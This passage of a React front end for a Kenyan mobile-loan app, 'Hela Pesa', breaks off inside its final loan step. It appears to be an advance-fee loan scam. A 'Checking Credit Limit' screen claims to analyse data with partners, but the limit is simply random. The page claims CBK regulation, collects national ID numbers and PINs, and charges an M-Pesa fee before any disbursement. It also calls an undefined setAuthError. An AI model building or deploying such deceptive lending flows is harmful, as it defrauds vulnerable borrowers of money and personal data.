import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
  User, Phone, Mail, MapPin, Heart, CreditCard,
  CheckCircle, ShieldCheck, Briefcase, BookOpen,
  AlertCircle, ChevronRight, LogOut, Home, History, Settings, Lock
} from 'lucide-react';

// ── Kenya Counties (all 47) ──────────────────────────────────────────────────
const KENYA_COUNTIES = [
  'Baringo', 'Bomet', 'Bungoma', 'Busia', 'Elgeyo-Marakwet', 'Embu', 'Garissa',
  'Homa Bay', 'Isiolo', 'Kajiado', 'Kakamega', 'Kericho', 'Kiambu', 'Kilifi',
  'Kirinyaga', 'Kisii', 'Kisumu', 'Kitui', 'Kwale', 'Laikipia', 'Lamu', 'Machakos',
  'Makueni', 'Mandera', 'Marsabit', 'Meru', 'Migori', 'Mombasa', "Murang'a",
  'Nairobi', 'Nakuru', 'Nandi', 'Narok', 'Nyamira', 'Nyandarua', 'Nyeri',
  'Samburu', 'Siaya', 'Taita-Taveta', 'Tana River', 'Tharaka-Nithi', 'Trans Nzoia',
  'Turkana', 'Uasin Gishu', 'Vihiga', 'Wajir', 'West Pokot',
];

// ── Loan type options ────────────────────────────────────────────────────────
const LOAN_TYPES = [
  { value: 'Personal', label: 'Personal', Icon: User, desc: 'Everyday needs' },
  { value: 'Business', label: 'Business', Icon: Briefcase, desc: 'Grow your hustle' },
  { value: 'Emergency', label: 'Emergency', Icon: AlertCircle, desc: 'Urgent expenses' },
  { value: 'Education', label: 'Education', Icon: BookOpen, desc: 'School & training' },
];

// ── Phone validator ──────────────────────────────────────────────────────────
const isValidKenyanPhone = (p) => {
  const c = p.replace(/\D/g, '');
  return (c.startsWith('07') && c.length === 10) ||
    (c.startsWith('01') && c.length === 10) ||
    (c.startsWith('254') && c.length === 12);
};

// ── Module-level styles (never recreated) ───────────────────────────────────
const labelStyle = {
  display: 'flex', alignItems: 'center', fontWeight: '600',
  fontSize: '0.85rem', color: '#374151', marginBottom: '6px',
};
const backBtnStyle = {
  background: 'none', border: 'none', color: 'var(--primary)',
  marginTop: '14px', cursor: 'pointer', fontSize: '0.88rem',
  display: 'block', width: '100%', textAlign: 'center',
};

// ────────────────────────────────────────────────────────────────────────────
const HelaPesa = () => {
  const [step, setStep] = useState('welcome');
  const [signupSub, setSignupSub] = useState(1); // 1 or 2
  const [formData, setFormData] = useState({
    fullName: '', phoneNumber: '', idNumber: '',
    email: '', county: '', maritalStatus: '', loanType: 'Personal',
    pin: '',
  });
  const [isLoggedIn, setIsLoggedIn] = useState(() => localStorage.getItem('isLoggedIn') === 'true');
  const [currentUser, setCurrentUser] = useState(() => {
    const saved = localStorage.getItem('currentUser');
    return saved ? JSON.parse(saved) : null;
  });
  const [touched, setTouched] = useState({});
  const [loanLimit, setLoanLimit] = useState(() => Number(localStorage.getItem('loanLimit')) || 0);
  const [reducedAmount, setReducedAmount] = useState(() => Number(localStorage.getItem('loanLimit')) || 0);
  const [paymentState, setPaymentState] = useState('idle');
  const [paymentRef, setPaymentRef] = useState('');
  const [paymentError, setPaymentError] = useState('');

  const nextStep = (s) => { window.scrollTo(0, 0); setStep(s); };

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
  };
  const handleBlur = (e) => setTouched(prev => ({ ...prev, [e.target.name]: true }));

  const calcFee = (amt) => Math.min(350, Math.max(50, Math.floor(50 + (amt - 1000) * (300 / 9000))));

  const generateLimit = () => {
    let limit;
    const r = Math.random();
    if (r < 0.97) {
      // 97% of loans are 5,400 and below
      limit = Math.floor(Math.random() * 4401) + 1000;
    } else {
      // 3% can go up to 50,000
      limit = Math.floor(Math.random() * 44601) + 5400;
    }
    // Round to nearest 100 for better UX
    limit = Math.round(limit / 100) * 100;
    setLoanLimit(limit);
    setReducedAmount(limit);
  };

  const handleLogin = async (e) => {
    e.preventDefault();
    if (!formData.phoneNumber || !formData.pin) {
      alert('Please enter both phone number and PIN');
      return;
    }
    setAuthLoading(true);
    setAuthError('');
    try {
      const res = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: formData.phoneNumber, pin: formData.pin }),
      });
      const data = await res.json();
      if (!res.ok) {
        setAuthError(data.error || 'Login failed');
        setAuthLoading(false);
        return;
      }
      setIsLoggedIn(true);
      const user = {
        name: data.user.fullName,
        phone: data.user.phoneNumber,
        limit: data.user.creditLimit,
        activeLoan: 0
      };
      setCurrentUser(user);
      setLoanLimit(data.user.creditLimit);
      setReducedAmount(data.user.creditLimit);
      nextStep('dashboard');
    } catch (err) {
      setAuthError('Connection error. Is the server running?');
    } finally {
      setAuthLoading(false);
    }
  };

  const [authLoading, setAuthLoading] = useState(false);

  const handleLogout = () => {
    setIsLoggedIn(false);
    setCurrentUser(null);
    setLoanLimit(0);
    setReducedAmount(0);
    localStorage.clear();
    setFormData(prev => ({ ...prev, pin: '' }));
    nextStep('welcome');
  };

  useEffect(() => {
    localStorage.setItem('isLoggedIn', isLoggedIn);
    localStorage.setItem('currentUser', JSON.stringify(currentUser));
    localStorage.setItem('loanLimit', loanLimit);
  }, [isLoggedIn, currentUser, loanLimit]);

  useEffect(() => {
    if (step === 'loading') {
      const t = setTimeout(() => {
        if (loanLimit === 0) generateLimit();
        nextStep('limit');
      }, 5000);
      return () => clearTimeout(t);
    }
  }, [step, loanLimit]);

  // ── Validation ──────────────────────────────────────────────────────────────
  const errors = {
    fullName: !formData.fullName.trim()
      ? 'Full name is required'
      : formData.fullName.trim().split(/\s+/).length < 2 ? 'Enter first and last name' : '',
    phoneNumber: !formData.phoneNumber
      ? 'Phone number is required'
      : !isValidKenyanPhone(formData.phoneNumber) ? 'Enter a valid Kenyan number e.g. 0712345678' : '',
    idNumber: !formData.idNumber.trim()
      ? 'ID number is required'
      : !/^\d{7,8}$/.test(formData.idNumber.trim()) ? 'Enter a valid 7–8 digit ID number' : '',
    county: !formData.county ? 'Please select your county' : '',
    maritalStatus: !formData.maritalStatus ? 'Please select marital status' : '',
    pin: !formData.pin ? 'PIN is required' : !/^\d{4}$/.test(formData.pin) ? 'Enter a 4-digit numeric PIN' : '',
  };
  const step1Valid = !errors.fullName && !errors.phoneNumber && !errors.idNumber;
  const step2Valid = !errors.county && !errors.maritalStatus && !errors.pin;

  const goStep1 = () => {
    setTouched({ fullName: true, phoneNumber: true, idNumber: true });
    if (step1Valid) { window.scrollTo(0, 0); setSignupSub(2); }
  };
  const goStep2 = () => {
    setTouched(prev => ({ ...prev, county: true, maritalStatus: true, pin: true }));
    if (step1Valid && step2Valid) {
      window.scrollTo(0, 0);
      nextStep('confirm');
    }
  };

  const handleRegister = async () => {
    setAuthLoading(true);
    try {
      const res = await fetch('/api/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData),
      });
      const data = await res.json();
      if (!res.ok) {
        alert(data.error || 'Registration failed');
        return;
      }
      
      // Auto-login upon registration
      setIsLoggedIn(true);
      setCurrentUser({
        name: data.user.fullName,
        phone: data.user.phoneNumber,
        limit: data.user.creditLimit,
        activeLoan: 0
      });

      // Synchronize client limit with server-generated limit
      if (data.user.creditLimit) {
        setLoanLimit(data.user.creditLimit);
        setReducedAmount(data.user.creditLimit);
      }

      nextStep('loading');
    } catch (err) {
      alert('Could not connect to server');
    } finally {
      setAuthLoading(false);
    }
  };

  // ── PayHero ────────────────────────────────────────────────────────────────
  const handlePayhero = async (fee) => {
    if (!formData.phoneNumber) {
      setPaymentError('Please provide a valid phone number.');
      setPaymentState('error');
      return;
    }
    setPaymentState('sending');
    setPaymentError('');
    const reference = `HELAPESA-${Date.now()}`;
    setPaymentRef(reference);
    try {
      const res = await fetch('/api/stk-push', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ amount: fee, phone_number: formData.phoneNumber, external_reference: reference }),
      });
      const data = await res.json();
      if (!res.ok) {
        const msg = data?.error?.message || data?.error?.errorMessage ||
          (typeof data?.error === 'string' ? data.error : null) ||
          'Payment initiation failed. Try again.';
        setPaymentError(msg);
        setPaymentState('error');
        return;
      }
      const serverRef = data?.reference || reference;
      setPaymentRef(serverRef);
      setPaymentState('awaiting');
      pollStatus(serverRef);
    } catch {
      setPaymentError('Network error. Check your connection and try again.');
      setPaymentState('error');
    }
  };

  const pollStatus = (ref) => {
    let attempts = 0;
    const iv = setInterval(async () => {
      attempts++;
      try {
        const res = await fetch(`/api/payment-status/${ref}`);
        const data = await res.json();
        const s = (data?.status || data?.transaction_status || '').toLowerCase();
        if (['success', 'complete', 'completed'].includes(s)) { clearInterval(iv); setPaymentState('success'); }
        else if (['failed', 'cancelled', 'canceled'].includes(s)) {
          clearInterval(iv);
          setPaymentError('Payment was cancelled or failed. Please try again.');
          setPaymentState('error');
        } else if (attempts >= 12) {
          clearInterval(iv);
          setPaymentError('Timed out. If you paid, your loan will be disbursed shortly.');
          setPaymentState('error');
        }
      } catch { /* keep polling */ }
    }, 5000);
  };

  // ── Helpers ─────────────────────────────────────────────────────────────────
  const inputStyle = (field) => ({
    width: '100%', padding: '13px 14px', borderRadius: '10px',
    border: `1.5px solid ${touched[field] && errors[field] ? '#ef4444' : touched[field] && !errors[field] ? '#10b981' : '#d1d5db'}`,
    fontSize: '1rem', background: '#f9fafb', outline: 'none',
    transition: 'border-color 0.2s', color: '#111827', fontFamily: 'inherit',
  });

  const FieldError = ({ field }) => touched[field] && errors[field] ? (
    <p style={{ color: '#dc2626', fontSize: '0.76rem', marginTop: '4px', display: 'flex', alignItems: 'center', gap: '4px' }}>
      <AlertCircle size={12} /> {errors[field]}
    </p>
  ) : null;

  const LogoHeader = () => (
    <div style={{ textAlign: 'center', marginBottom: '1.5rem' }}>
      <img src="/logo.png" alt="Hela Pesa" style={{ width: '52px', borderRadius: '12px' }} />
      <div style={{ fontWeight: '800', color: 'var(--primary)', fontSize: '1.05rem', marginTop: '6px' }}>hela pesa</div>
    </div>
  );

  const NavBar = () => (
    <nav className="navbar">
      <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
        <img src="/logo.png" alt="Logo" style={{ width: '32px' }} />
        <span style={{ fontWeight: '800', color: 'var(--primary)', fontSize: '1.4rem' }}>hela pesa</span>
      </div>
      <div className="nav-links">
        <a href="#about">About us</a> <a href="#faq">FAQs</a>
        <a href="#careers">Careers</a> <a href="#news">News</a>
        <a href="#contact">Contact us</a>
        <button className="btn btn-login" onClick={() => nextStep('auth')}>Login</button>
      </div>
    </nav>
  );

  const ProgressBar = ({ step, total, labels }) => (
    <div style={{ marginBottom: '1.5rem' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '5px' }}>
        {labels.map((l, i) => (
          <span key={i} style={{
            fontSize: '0.72rem', flex: 1,
            textAlign: i === 0 ? 'left' : 'right',
            fontWeight: i + 1 === step ? '700' : '500',
            color: i + 1 <= step ? 'var(--primary)' : '#9ca3af',
          }}>{l}</span>
        ))}
      </div>
      <div style={{ height: '4px', background: '#e5e7eb', borderRadius: '99px', overflow: 'hidden' }}>
        <div style={{ height: '100%', width: `${(step / total) * 100}%`, background: 'var(--primary)', borderRadius: '99px', transition: 'width 0.4s ease' }} />
      </div>
    </div>
  );

  // ═══════════════════════════════════════════════════════════════════════════
  return (
    <div className="app-container">
      <AnimatePresence mode="wait">

        {/* ── WELCOME ── */}
        {step === 'welcome' && (
          <motion.div key="welcome" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
            <NavBar />
            <section className="hero">
              <div className="hero-bg-curve" />
              <div className="hero-content">
                <h1 className="hero-title">Hela Pesa</h1>
                <p className="hero-subtitle">
                  Hela Pesa: Access instant mobile loans up to Ksh 50,000.
                </p>
                <button className="btn btn-cta" onClick={() => nextStep('auth')}>
                  Get Started with Hela Pesa
                </button>
                <div className="regulated">Regulated by CBK 🇰🇪 🎊</div>
              </div>
              <div className="hero-image-container">
                <img src="/hero.png" alt="App Mockup" className="hero-image" />
              </div>
            </section>
          </motion.div>
        )}

        {/* ── AUTH ── */}
        {step === 'auth' && (
          <motion.div key="auth" initial={{ opacity: 0, x: 50 }} animate={{ opacity: 1, x: 0 }} className="page-transition">
            <LogoHeader />
            <div className="card glass">
              <h2 style={{ color: 'var(--primary)', marginBottom: '0.4rem' }}>Access Your Account</h2>
              <p className="subtitle" style={{ marginBottom: '1.5rem' }}>Login or create a new account to continue.</p>
              <div style={{ display: 'grid', gap: '0.8rem' }}>
                <button className="btn btn-login"
                  style={{ width: '100%', justifyContent: 'center' }}
                  onClick={() => { setSignupSub(1); nextStep('signup'); }}>
                  Sign Up — New Account
                </button>
                <button className="btn"
                  style={{ width: '100%', padding: '14px', borderRadius: '8px', border: '1.5px solid #d1d5db',
                    background: 'white', color: 'var(--primary)', fontWeight: '600', cursor: 'pointer', fontSize: '1rem',
                    display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px' }}
                  onClick={() => nextStep('login')}>
                  <User size={18} /> Login — Existing User
                </button>
              </div>
              <button style={backBtnStyle} onClick={() => nextStep('welcome')}>← Back Home</button>
            </div>
          </motion.div>
        )}

        {/* ── LOGIN ── */}
        {step === 'login' && (
          <motion.div key="login" initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="page-transition">
            <LogoHeader />
            <div className="card glass">
              <h2 style={{ color: 'var(--primary)', marginBottom: '0.4rem' }}>Welcome Back</h2>
              <p className="subtitle" style={{ marginBottom: '1.5rem' }}>Enter your details to access your dashboard.</p>
              
              <form onSubmit={handleLogin}>
                <div style={{ marginBottom: '1.2rem' }}>
                  <label style={labelStyle} htmlFor="loginPhone">
                    <Phone size={13} style={{ marginRight: 5 }} />M-Pesa Number
                  </label>
                  <div style={{ position: 'relative' }}>
                    <span style={{
                      position: 'absolute', left: '14px', top: '50%', transform: 'translateY(-50%)',
                      color: '#6b7280', fontSize: '0.9rem', fontWeight: '600', pointerEvents: 'none'
                    }}>🇰🇪 +254</span>
                    <input
                      id="loginPhone" name="phoneNumber" type="tel" inputMode="numeric"
                      value={formData.phoneNumber} onChange={handleChange}
                      placeholder="0712 345 678"
                      style={{ ...inputStyle('phoneNumber'), paddingLeft: '90px' }}
                    />
                  </div>
                </div>

                <div style={{ marginBottom: '1.6rem' }}>
                  <label style={labelStyle} htmlFor="loginPin">
                    <Lock size={13} style={{ marginRight: 5 }} />Account PIN
                  </label>
                  <input
                    id="loginPin" name="pin" type="password" inputMode="numeric" maxLength={4}
                    value={formData.pin} onChange={handleChange}
                    placeholder="Enter 4-digit PIN"
                    style={{ ...inputStyle('pin'), textAlign: 'center', letterSpacing: '8px', fontSize: '1.2rem' }}
                  />
                </div>

                <button type="submit" className="btn btn-login" style={{ width: '100%', justifyContent: 'center' }} disabled={authLoading}>
                  {authLoading ? 'Signing in...' : 'Sign In'}
                </button>
              </form>
              
              <button style={backBtnStyle} onClick={() => nextStep('auth')}>← Back</button>
            </div>
          </motion.div>
        )}

        {/* ── DASHBOARD ── */}
        {step === 'dashboard' && (
          <motion.div key="dashboard" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="page-transition">
            <nav className="navbar" style={{ padding: '15px 5%' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                <img src="/logo.png" alt="Logo" style={{ width: '28px' }} />
                <span style={{ fontWeight: '800', color: 'var(--primary)', fontSize: '1.2rem' }}>hela pesa</span>
              </div>
              <button 
                onClick={handleLogout}
                style={{ padding: '8px 12px', borderRadius: '8px', border: '1px solid #e5e7eb', background: 'white', color: '#6b7280', display: 'flex', alignItems: 'center', gap: '6px', cursor: 'pointer', fontSize: '0.85rem' }}>
                <LogOut size={16} /> Logout
              </button>
            </nav>

            <div style={{ padding: '20px', maxWidth: '1000px', margin: '0 auto' }}>
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(300px, 1fr))', gap: '20px' }}>
                
                {/* Profile Widget */}
                <div className="card glass" style={{ margin: 0, padding: '24px' }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '15px', marginBottom: '20px' }}>
                    <div style={{ width: 60, height: 60, background: '#eff6ff', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', color: 'var(--primary)' }}>
                      <User size={30} />
                    </div>
                    <div>
                      <h3 style={{ margin: 0, color: 'var(--primary)' }}>{currentUser?.name || 'User'}</h3>
                      <p style={{ margin: 0, fontSize: '0.85rem', color: 'var(--text-muted)' }}>+254 {currentUser?.phone}</p>
                    </div>
                  </div>
                  <div style={{ background: '#f9fafb', borderRadius: '12px', padding: '15px' }}>
                    <div style={{ fontSize: '0.8rem', color: 'var(--text-muted)', marginBottom: '4px' }}>Available Credit Limit</div>
                    <div style={{ fontSize: '1.8rem', fontWeight: '800', color: 'var(--primary)' }}>KSH {currentUser?.limit.toLocaleString()}</div>
                  </div>
                  <button className="btn btn-login" style={{ width: '100%', marginTop: '16px', justifyContent: 'center' }} onClick={() => nextStep('final')}>
                    Borrow Money
                  </button>
                </div>

                {/* Quick Actions */}
                <div style={{ display: 'grid', gridTemplateRows: 'repeat(3, 1fr)', gap: '12px' }}>
                  {[
                    { label: 'Transaction History', icon: History, color: '#6366f1' },
                    { label: 'Account Settings', icon: Settings, color: '#6b7280' },
                    { label: 'Refer a Friend', icon: User, color: '#10b981' },
                  ].map(({ label, icon: Icon, color }) => (
                    <button key={label} style={{ 
                      padding: '16px', borderRadius: '15px', border: '1px solid #e5e7eb', background: 'white', 
                      display: 'flex', alignItems: 'center', gap: '12px', cursor: 'pointer', textAlign: 'left'
                    }}>
                      <div style={{ padding: '8px', borderRadius: '10px', background: `${color}15`, color: color }}>
                        <Icon size={20} />
                      </div>
                      <span style={{ fontWeight: '600', color: '#374151', fontSize: '0.95rem' }}>{label}</span>
                      <ChevronRight size={16} style={{ marginLeft: 'auto', color: '#9ca3af' }} />
                    </button>
                  ))}
                </div>

              </div>
              
              {/* Bottom Nav Simulation */}
              <div style={{ 
                position: 'fixed', bottom: 0, left: 0, right: 0, background: 'white', borderTop: '1px solid #e5e7eb',
                display: 'flex', justifyContent: 'space-around', padding: '12px 10px', zIndex: 100
              }}>
                {[
                  { icon: Home, label: 'Home', active: true },
                  { icon: CreditCard, label: 'Loans', active: false },
                  { icon: History, label: 'Activity', active: false },
                  { icon: User, label: 'Account', active: false },
                ].map(({ icon: Icon, label, active }) => (
                  <div key={label} style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '4px', cursor: 'pointer' }}>
                    <Icon size={20} color={active ? 'var(--primary)' : '#9ca3af'} />
                    <span style={{ fontSize: '0.65rem', fontWeight: active ? '700' : '500', color: active ? 'var(--primary)' : '#9ca3af' }}>{label}</span>
                  </div>
                ))}
              </div>
            </div>
          </motion.div>
        )}

        {/* ── SIGNUP — inline JSX (not a nested component) to preserve focus ── */}
        {step === 'signup' && (
          <motion.div key="signup" initial={{ opacity: 0, x: 50 }} animate={{ opacity: 1, x: 0 }} className="page-transition">
            <LogoHeader />
            <div className="card glass">
              <ProgressBar step={signupSub} total={2} labels={['Your Details', 'More Info']} />

              {/* ── Sub-step 1: Name · Phone · ID ── */}
              {signupSub === 1 && (
                <div>
                  <h2 style={{ color: 'var(--primary)', marginBottom: '0.3rem' }}>Personal Details</h2>
                  <p className="subtitle" style={{ marginBottom: '1.4rem' }}>We need this to assess your loan limit.</p>

                  {/* Full Name */}
                  <div style={{ marginBottom: '1rem' }}>
                    <label style={labelStyle} htmlFor="fullName">
                      <User size={13} style={{ marginRight: 5 }} />Full Name
                    </label>
                    <input
                      id="fullName" name="fullName" autoComplete="name"
                      value={formData.fullName} onChange={handleChange} onBlur={handleBlur}
                      placeholder="e.g. Jane Wanjiru Kamau"
                      style={inputStyle('fullName')}
                    />
                    <FieldError field="fullName" />
                  </div>

                  {/* Phone Number */}
                  <div style={{ marginBottom: '1rem' }}>
                    <label style={labelStyle} htmlFor="phoneNumber">
                      <Phone size={13} style={{ marginRight: 5 }} />M-Pesa Phone Number
                    </label>
                    <div style={{ position: 'relative' }}>
                      <span style={{
                        position: 'absolute', left: '14px', top: '50%', transform: 'translateY(-50%)',
                        color: '#6b7280', fontSize: '0.9rem', fontWeight: '600', pointerEvents: 'none', userSelect: 'none',
                      }}>🇰🇪 +254</span>
                      <input
                        id="phoneNumber" name="phoneNumber" type="tel" autoComplete="tel" inputMode="numeric"
                        value={formData.phoneNumber} onChange={handleChange} onBlur={handleBlur}
                        placeholder="0712 345 678"
                        style={{ ...inputStyle('phoneNumber'), paddingLeft: '90px' }}
                      />
                    </div>
                    {!(touched.phoneNumber && errors.phoneNumber) && (
                      <p style={{ fontSize: '0.74rem', color: '#6b7280', marginTop: '4px' }}>
                        M-Pesa STK prompt will go to this number
                      </p>
                    )}
                    <FieldError field="phoneNumber" />
                  </div>

                  {/* National ID */}
                  <div style={{ marginBottom: '1.6rem' }}>
                    <label style={labelStyle} htmlFor="idNumber">
                      <ShieldCheck size={13} style={{ marginRight: 5 }} />National ID Number
                    </label>
                    <input
                      id="idNumber" name="idNumber" inputMode="numeric" maxLength={8}
                      value={formData.idNumber} onChange={handleChange} onBlur={handleBlur}
                      placeholder="e.g. 12345678"
                      style={inputStyle('idNumber')}
                    />
                    <FieldError field="idNumber" />
                  </div>

                  <button className="btn btn-login" style={{ width: '100%', justifyContent: 'center' }} onClick={goStep1}>
                    Continue <ChevronRight size={16} />
                  </button>
                  <button style={backBtnStyle} onClick={() => nextStep('auth')}>← Back</button>
                </div>
              )}

              {/* ── Sub-step 2: Email · County · Marital · Loan type ── */}
              {signupSub === 2 && (
                <div>
                  <h2 style={{ color: 'var(--primary)', marginBottom: '0.3rem' }}>Final Details</h2>
                  <p className="subtitle" style={{ marginBottom: '1.4rem' }}>Set your account PIN to secure your access.</p>

                  {/* Email (optional) */}
                  <div style={{ marginBottom: '1rem' }}>
                    <label style={labelStyle} htmlFor="email">
                      <Mail size={13} style={{ marginRight: 5 }} />
                      Email <span style={{ color: '#9ca3af', fontWeight: 400, marginLeft: 4 }}>(optional)</span>
                    </label>
                    <input
                      id="email" name="email" type="email" autoComplete="email"
                      value={formData.email} onChange={handleChange}
                      placeholder="you@example.com"
                      style={inputStyle('email')}
                    />
                  </div>

                  {/* County */}
                  <div style={{ marginBottom: '1rem' }}>
                    <label style={labelStyle} htmlFor="county">
                      <MapPin size={13} style={{ marginRight: 5 }} />County of Residence
                    </label>
                    <select
                      id="county" name="county"
                      value={formData.county} onChange={handleChange} onBlur={handleBlur}
                      style={{
                        ...inputStyle('county'),
                        appearance: 'none',
                        backgroundImage: `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%236b7280' d='M6 8L1 3h10z'/%3E%3C/svg%3E")`,
                        backgroundRepeat: 'no-repeat',
                        backgroundPosition: 'right 14px center',
                        paddingRight: '36px',
                        cursor: 'pointer',
                      }}
                    >
                      <option value="">Select your county</option>
                      {KENYA_COUNTIES.map(c => <option key={c} value={c}>{c}</option>)}
                    </select>
                    <FieldError field="county" />
                  </div>

                  {/* Marital Status — button chips */}
                  <div style={{ marginBottom: '1rem' }}>
                    <label style={labelStyle}>
                      <Heart size={13} style={{ marginRight: 5 }} />Marital Status
                    </label>
                    <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: '8px' }}>
                      {['Single', 'Married', 'Divorced'].map(s => (
                        <button
                          key={s} type="button"
                          onClick={() => { setFormData(p => ({ ...p, maritalStatus: s })); setTouched(p => ({ ...p, maritalStatus: true })); }}
                          style={{
                            padding: '11px 6px', borderRadius: '10px', cursor: 'pointer', fontSize: '0.85rem',
                            border: `2px solid ${formData.maritalStatus === s ? 'var(--primary)' : '#e5e7eb'}`,
                            background: formData.maritalStatus === s ? '#eff6ff' : 'white',
                            color: formData.maritalStatus === s ? 'var(--primary)' : '#6b7280',
                            fontWeight: formData.maritalStatus === s ? '700' : '500',
                            transition: 'all 0.15s', fontFamily: 'inherit',
                          }}
                        >{s}</button>
                      ))}
                    </div>
                    <FieldError field="maritalStatus" />
                  </div>

                  {/* Account PIN */}
                  <div style={{ marginBottom: '1rem' }}>
                    <label style={labelStyle} htmlFor="pin">
                      <Lock size={13} style={{ marginRight: 5 }} />Set Account PIN (4 Digits)
                    </label>
                    <input
                      id="pin" name="pin" type="password" inputMode="numeric" maxLength={4}
                      value={formData.pin} onChange={handleChange} onBlur={handleBlur}
                      placeholder="e.g. 1234"
                      style={{ ...inputStyle('pin'), textAlign: 'center', letterSpacing: '8px', fontSize: '1.2rem' }}
                    />
                    <FieldError field="pin" />
                  </div>

                  {/* Loan Type — card grid */}
                  <div style={{ marginBottom: '1.6rem' }}>
                    <label style={labelStyle}>
                      <CreditCard size={13} style={{ marginRight: 5 }} />Type of Loan
                    </label>
                    <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px', marginTop: '4px' }}>
                      {LOAN_TYPES.map(({ value, label, Icon, desc }) => (
                        <button
                          key={value} type="button"
                          onClick={() => setFormData(p => ({ ...p, loanType: value }))}
                          style={{
                            padding: '12px', borderRadius: '12px', cursor: 'pointer', textAlign: 'left',
                            border: `2px solid ${formData.loanType === value ? 'var(--primary)' : '#e5e7eb'}`,
                            background: formData.loanType === value ? '#eff6ff' : 'white',
                            transition: 'all 0.15s', fontFamily: 'inherit',
                          }}
                        >
                          <Icon size={18} color={formData.loanType === value ? 'var(--primary)' : '#9ca3af'} />
                          <div style={{ fontWeight: '700', fontSize: '0.85rem', color: formData.loanType === value ? 'var(--primary)' : '#374151', marginTop: '6px' }}>{label}</div>
                          <div style={{ fontSize: '0.72rem', color: '#9ca3af', marginTop: '2px' }}>{desc}</div>
                        </button>
                      ))}
                    </div>
                  </div>

                  <button 
                    className="btn btn-login" 
                    style={{ width: '100%', justifyContent: 'center' }} 
                    onClick={goStep2}
                    disabled={authLoading}
                  >
                    {authLoading ? 'Registering...' : 'Check My Limit'} <ChevronRight size={16} />
                  </button>
                  <button style={backBtnStyle} onClick={() => setSignupSub(1)}>← Back</button>
                </div>
              )}
            </div>
          </motion.div>
        )}

        {/* ── CONFIRM ── */}
        {step === 'confirm' && (
          <motion.div key="confirm" initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="page-transition">
            <LogoHeader />
            <div className="card glass">
              <h2 style={{ color: 'var(--primary)', marginBottom: '0.4rem' }}>Confirm Details</h2>
              <p className="subtitle" style={{ marginBottom: '1.2rem' }}>Review your info before we process your limit.</p>
              <div style={{ background: '#f9fafb', padding: '18px', borderRadius: '14px', marginBottom: '20px' }}>
                {[
                  ['Full Name', formData.fullName],
                  ['Phone', formData.phoneNumber],
                  ['ID Number', formData.idNumber],
                  ['Email', formData.email || '—'],
                  ['County', formData.county],
                  ['Marital Status', formData.maritalStatus],
                  ['Loan Type', formData.loanType],
                ].map(([label, val]) => (
                  <div key={label} style={{ display: 'flex', justifyContent: 'space-between', padding: '9px 0', borderBottom: '1px solid #e5e7eb' }}>
                    <span style={{ color: 'var(--text-muted)', fontSize: '0.88rem' }}>{label}</span>
                    <span style={{ fontWeight: '600', fontSize: '0.9rem', maxWidth: '55%', textAlign: 'right' }}>{val}</span>
                  </div>
                ))}
              </div>
              <button 
                className="btn btn-login" 
                style={{ width: '100%', justifyContent: 'center' }} 
                onClick={handleRegister}
                disabled={authLoading}
              >
                {authLoading ? 'Registering...' : 'Process My Limit'}
              </button>
              <button style={{
                width: '100%', marginTop: '10px', padding: '13px', borderRadius: '8px',
                border: '1.5px solid #d1d5db', background: 'white', color: 'var(--primary)',
                fontWeight: '600', cursor: 'pointer', fontFamily: 'inherit'
              }}
                onClick={() => { setSignupSub(1); nextStep('signup'); }}>
                Edit Details
              </button>
            </div>
          </motion.div>
        )}

        {/* ── LOADING ── */}
        {step === 'loading' && (
          <motion.div key="loading" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="page-transition">
            <LogoHeader />
            <div className="card glass" style={{ marginTop: '5vh', textAlign: 'center' }}>
              <div style={{
                width: 60, height: 60, borderRadius: '50%', margin: '0 auto 20px',
                border: '4px solid #e5e7eb', borderTop: '4px solid var(--primary)',
                animation: 'spin 1s linear infinite'
              }} />
              <h2 style={{ color: 'var(--primary)' }}>Checking Credit Limit</h2>
              <p className="subtitle">Analyzing your information with our partners. Please wait…</p>
            </div>
            <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
          </motion.div>
        )}

        {/* ── LIMIT ── */}
        {step === 'limit' && (
          <motion.div key="limit" initial={{ opacity: 0, scale: 1.05 }} animate={{ opacity: 1, scale: 1 }} className="page-transition">
            <LogoHeader />
            <div className="card glass" style={{ textAlign: 'center' }}>
              <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.4 }}>
                <CheckCircle size={60} color="#10b981" style={{ margin: '0 auto 1.5rem' }} />
                <h2 style={{ color: 'var(--primary)' }}>Approval Success!</h2>
                <p className="subtitle">Based on your details, your maximum credit limit is:</p>
                <div className="limit-display" style={{ fontSize: '3.5rem', fontWeight: '800', margin: '1rem 0' }}>
                  KSH {loanLimit.toLocaleString()}
                </div>
                <p style={{ color: 'var(--text-muted)', marginBottom: '2rem' }}>Repayment term: 21 days</p>
                <button className="btn btn-login" style={{ width: '100%', justifyContent: 'center' }} onClick={() => nextStep('final')}>
                  Get Loan
                </button>
              </motion.div>
            </div>
          </motion.div>
        )}

        {/* ── FINAL ── */}
        {step === 'final' && (() => {
          const period = reducedAmount > 5000 ? 21 : 7;
          const fee = calcFee(reducedAmount);
          const interest = Math.round(reducedAmount * 0.18);
